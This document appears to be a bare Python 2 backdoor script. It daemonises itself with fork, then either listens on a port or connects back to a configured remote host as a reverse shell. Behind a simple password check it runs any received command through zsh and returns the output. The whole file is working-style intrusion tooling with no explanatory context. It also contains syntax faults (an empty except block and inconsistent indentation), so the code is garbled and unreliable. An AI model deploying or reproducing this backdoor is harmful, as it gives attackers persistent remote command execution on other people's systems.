

import os, sys, socket, time


MAX_LEN=1024
SHELL="/bin/zsh -c"
TIME_OUT=300 #s
PW=""
PORT=""
HOST=""



def shell(cmd):
	sh_out=os.popen(SHELL+" "+cmd).readlines()
	nsh_out=""
	for i in range(len(sh_out)):
		nsh_out+=sh_out[i]
	return nsh_out

# action?
def action(conn):
	conn.send("\nPass?\n")
	try: pw_in=conn.recv(len(PW))
	except:
	else:
		if pw_in == PW:
			conn.send("j00 are on air!\n")
			while True:
				conn.send(">>> ")
				try:
					pcmd=conn.recv(MAX_LEN)
				except:
					return True
				else:

					cmd=""
					for i in range(len(pcmd)-1):
						cmd+=pcmd[i]
			                if cmd==":dc":
						return True
					elif cmd==":sd":
						return False
					else:
						if len(cmd)>0:
							out=shell(cmd)
							conn.send(out)



argv=sys.argv



PORT=int(PORT)


if os.fork()!=0:
	sys.exit(0)


sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(TIME_OUT)

if argv[1]=="-b":
	sock.bind(('localhost', PORT))
	sock.listen(0)

run=True
while run:

	if argv[1]=="-r":
		try: sock.connect( (HOST, PORT) )
		except:

			time.sleep(5)
		else: run=action(sock)
	else:
		try:	(conn,addr)=sock.accept()
		except:

			time.sleep(1)
		else: run=action(conn)

	if argv[1]=="-b": conn.shutdown(2)
	else:
		try: sock.send("")
		except: time.sleep(1)
		else: sock.shutdown(2)
